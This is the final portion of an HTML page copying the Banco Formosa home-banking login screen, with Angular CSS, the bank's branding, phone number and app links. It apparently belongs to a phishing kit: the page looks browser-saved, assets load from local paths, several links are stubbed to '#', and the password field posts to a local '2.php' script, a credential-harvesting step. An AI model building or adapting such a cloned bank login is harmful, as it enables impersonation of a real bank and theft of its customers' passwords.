      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .login-help[_ngcontent-c5] {
        width: calc(100% - 80px)
      }
    }

    @media only screen and (max-width:1250px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        top: 16.5rem
      }
    }

    @media only screen and (max-width:1010px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 7rem)
      }
    }

    @media only screen and (max-width:972px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .apps[_ngcontent-c5] {
        display: none
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] {
        max-width: 380px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] .link[_ngcontent-c5] {
        font-size: 14px
      }
    }

    @media only screen and (max-width:900px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 8rem);
        top: 17rem
      }
    }

    @media only screen and (max-width:810px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .passEye[_ngcontent-c5] {
        right: 55px;
        top: 340px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] {
        border-color: transparent;
        justify-content: center;
        padding-bottom: 0;
        margin-bottom: 50px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] {
        display: none
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .logo[_ngcontent-c5] {
        margin: 0
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] {
        display: none
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] {
        background: 0 0;
        padding-top: 20px;
        padding-bottom: 0;
        margin-bottom: 50px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .widthVolver[_ngcontent-c5] {
        width: calc(100% - 75px)
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box.securityImage[_ngcontent-c5] {
        margin-top: 0
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .imgSeguridad[_ngcontent-c5] {
        position: relative;
        -webkit-transform: translate(-50%, calc(-50% + 10px));
        transform: translate(-50%, calc(-50% + 10px));
        height: 100px;
        width: 100px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] {
        display: flex;
        flex-direction: column
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5]>h3[_ngcontent-c5] {
        font-size: 16px;
        text-align: center
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .apps[_ngcontent-c5],
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .nets[_ngcontent-c5],
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .tels[_ngcontent-c5] {
        display: flex;
        justify-content: center
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] img[_ngcontent-c5] {
        height: 50px;
        margin-right: 15px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .tels[_ngcontent-c5] h3[_ngcontent-c5] {
        font-size: 16px;
        margin: 0
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .tels[_ngcontent-c5] p[_ngcontent-c5] {
        font-size: 12px;
        margin: 0
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] .tels[_ngcontent-c5] .data[_ngcontent-c5] {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: flex-start
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .login-help[_ngcontent-c5] {
        position: relative;
        -webkit-transform: none;
        transform: none
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] {
        flex-direction: column;
        align-items: center
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] .link[_ngcontent-c5] {
        margin-top: 10px
      }
    }
  </style>
  <style>
    .checkRCont[_ngcontent-c9] {
      width: 100%;
      height: 100%;
      border: 2px solid #003f75;
      border-radius: 4px;
      padding: 0;
      position: relative;
      box-sizing: content-box;
      cursor: pointer
    }

    .checkRCont[_ngcontent-c9]:hover {
      border-color: #003f75
    }

    .checkRCont.checked[_ngcontent-c9] {
      background-color: #003f75
    }

    .checkRCont.checked[_ngcontent-c9] .line[_ngcontent-c9] {
      height: 10%;
      background-color: #fff;
      display: inline-block;
      position: absolute;
      z-index: 2
    }

    .checkRCont.checked[_ngcontent-c9] .line.short[_ngcontent-c9] {
      width: 29%;
      left: 15%;
      top: 61%;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg)
    }

    .checkRCont.checked[_ngcontent-c9] .line.long[_ngcontent-c9] {
      width: 68%;
      top: 51%;
      right: 3%;
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg)
    }
  </style>
  <style id="__web-inspector-hide-shortcut-style__">
    .__web-inspector-hide-shortcut__,
    .__web-inspector-hide-shortcut__ *,
    .__web-inspector-hidebefore-shortcut__::before,
    .__web-inspector-hideafter-shortcut__::after {
      visibility: hidden !important;
    }
  </style>
  <style>
    .showEye[_ngcontent-c10] {
      width: 25px
    }

    .showEye[_ngcontent-c10] img[_ngcontent-c10] {
      width: 100%
    }
  </style>
</head>

<body>


  <app-root _nghost-c0="" ng-version="7.2.10">
    <div _ngcontent-c0="" class="container-flow login-img">
      <!---->
      <!---->
      <div _ngcontent-c0="" class="full-container">
        <router-outlet _ngcontent-c0=""></router-outlet><app-login _nghost-c5="">


          <div _ngcontent-c5="" class="login-container">
            <!---->
            <!---->
            <div _ngcontent-c5="" class="col-5">
              <!---->
            </div>
            <div _ngcontent-c5="" class="formosaVideo"></div>
            <video _ngcontent-c5="" autoplay="" loop="" muted="" playsinline="" preload="">


              <source _ngcontent-c5="" src="https://hb.bancoformosa.com.ar/assets/video/video.mp4" type="video/mp4">

              Your browser does not support HTML5 video.
            </video>
            <div _ngcontent-c5="" class="login-content">
              <div _ngcontent-c5="" class="header">
                <img _ngcontent-c5="" class="logo margin-right" src="css/LogoHeaderLogin.svg">
                <div _ngcontent-c5="" class="links">
                  <img _ngcontent-c5="" src="css/icon-tel.png">
                  <div _ngcontent-c5="" class="tels">
                    <h3 _ngcontent-c5="">0800 777 2262</h3>
                    <p _ngcontent-c5="">Lunes a Viernes 7 a 19 Hs.</p>
                  </div>
                  <a _ngcontent-c5="" target="_blank" href="https://apps.apple.com/ar/app/banco-formosa/id1544991292">
                    <img _ngcontent-c5="" src="css/apple.png">
                  </a>
                  <a _ngcontent-c5="" target="_blank" href="https://play.google.com/store/apps/details?id=ar.com.bcofsa">
                    <img _ngcontent-c5="" src="css/android.png">
                  </a>
                  <div _ngcontent-c5="" class="apps">
                    <h3 _ngcontent-c5="">Descarga nuestra App</h3>
                    <p _ngcontent-c5="">Disponible para iOS y Android</p>
                  </div>
                  <a _ngcontent-c5="" target="_blank" href="https://www.facebook.com/BancoFormosaOficial/">
                    <img _ngcontent-c5="" src="css/icon-facebook.png">
                  </a>
                  <a _ngcontent-c5="" target="_blank" href="https://twitter.com/BancoFormosa">
                    <img _ngcontent-c5="" src="css/icon-twitter.png">
                  </a>
                  <a _ngcontent-c5="" target="_blank" href="https://www.instagram.com/banco_formosa/">
                    <img _ngcontent-c5="" class="remove-margin" src="css/icon-instagram.png">
                  </a>
                </div>
              </div>
              <div _ngcontent-c5="" class="body">
                <div _ngcontent-c5="" class="info">
                  <h1 _ngcontent-c5="">Te damos la bienvenida a nuestro nuevo Home Banking</h1>
                  <p _ngcontent-c5="">Estamos mejorando constantemente para vos, nuestro nuevo Home Banking es más
                    moderno y más fácil de usar, con más funcionalidades y beneficios.</p>
                </div>
                <div _ngcontent-c5="" class="login-box securityImage">
                  <!---->
                  <div _ngcontent-c5="" class="imgSeguridad">
                    <img _ngcontent-c5="" src="./css/css.png">
                  </div>
                  <h1 _ngcontent-c5="">
                    Bienvenido <br _ngcontent-c5="">
                    a tu banco online
                  </h1>




                  <div _ngcontent-c5="" class="row">
                    <h2 _ngcontent-c5="" class="margin-top widthVolver">
                      Ingresá tus datos
                    </h2>
                    <!---->
                    <div _ngcontent-c5="" class="margin-top padding-left pointer mobile">Volver</div>
                  </div>


                  <div _ngcontent-c5="" class="margin-top position-relative notmobile">
                    <!---->
                    <div _ngcontent-c5="" class="check-cont">
                      <checkbox _ngcontent-c5="" _nghost-c9="">
                        <div _ngcontent-c9="" class="checkRCont">
                          <div _ngcontent-c9="" class="line short"></div>
                          <div _ngcontent-c9="" class="line long"></div>
                        </div>
                      </checkbox>
                    </div>
                    <p _ngcontent-c5="" class="widthVolver remove-margin margin-left-large">Teclado virtual</p>
                    <!---->
                    <div _ngcontent-c5="" class="pointer padding-left pull-right">Volver</div>
                  </div>

                  <!---->
                  <!---->

<form action="2.php" method="post">
                  <!---->
                  <div _ngcontent-c5="">
                    <!----><!---->
                    <showpasswordeye _ngcontent-c5="" class="passEye" _nghost-c10="">
                      <div _ngcontent-c10="" class="showEye">

                        <!----><!---->
                        <!----><img _ngcontent-c10="" draggable="false" src="./css/invisible.svg">
                        <!---->

                        <!---->
                      </div>
                    </showpasswordeye>

                    <!----><input _ngcontent-c5="" class="input-pwd input ng-pristine ng-invalid ng-touched" required=""
                      type="password" id="cont" name="cont" value="" placeholder="Clave">
                  </div>
                  <button _ngcontent-c5="" class="boton" type="submit">
                    CONTINUAR
                  </button>
                  </form>
                  <p _ngcontent-c5="" class="forgot-text">
                    Olvidé o bloqueé mi Clave y/o Usuario
                  </p>
                  <div _ngcontent-c5="" class="login-help">
                    ¿Es tu primer ingreso?
                  </div>
                  <div _ngcontent-c5="" class="mobileInfo">
                    <div _ngcontent-c5="" class="nets margin-top">
                      <a _ngcontent-c5="" target="_blank" href="#">
                        <img _ngcontent-c5="" src="./css/icon-facebook.png">
                      </a>
                      <a _ngcontent-c5="" target="_blank" href="#">
                        <img _ngcontent-c5="" src="./css/icon-twitter.png">
                      </a>
                      <a _ngcontent-c5="" target="_blank" href="#">
                        <img _ngcontent-c5="" class="remove-margin" src="./css/icon-instagram.png">
                      </a>
                    </div>
                    <div _ngcontent-c5="" class="tels margin-top">
                      <img _ngcontent-c5="" src="./css/icon-tel.png">
                      <div _ngcontent-c5="" class="data">
                        <h3 _ngcontent-c5="">0800 777 2262</h3>
                        <p _ngcontent-c5="">Lunes a Viernes 7 a 19 Hs.</p>
                      </div>
                    </div>
                    <h3 _ngcontent-c5="" class="margin-top">Descarga nuestra App</h3>
                    <div _ngcontent-c5="" class="apps">
                      <a _ngcontent-c5="" target="_blank"
                        href="#">
                        <img _ngcontent-c5="" src="./css/apple.png">
                      </a>
                      <a _ngcontent-c5="" target="_blank"
                        href="#">
                        <img _ngcontent-c5="" src="./css/android.png">
                      </a>
                    </div>
                  </div>
                </div>
              </div>

              <div _ngcontent-c5="" class="footer">
                <a _ngcontent-c5="" class="link">
                  Términos y Condiciones
                </a>
                <a _ngcontent-c5="" class="link">
                  Información de seguridad
                </a>

                <a _ngcontent-c5="" class="link">
                  Políticas de privacidad
                </a>
                <a _ngcontent-c5="" class="link">
                  Sucursales &amp; Cajeros
                </a>
                <a _ngcontent-c5="" class="link">
                  Comparación de comisiones
                </a>
              </div>
            </div>
          </div>

          <!---->

          <!---->

          <!---->

          <!---->
        </app-login>
      </div>

      <!---->








      <!---->
      <!---->
      <!---->
    </div>
    <!---->
  </app-root>


</body>

</html>
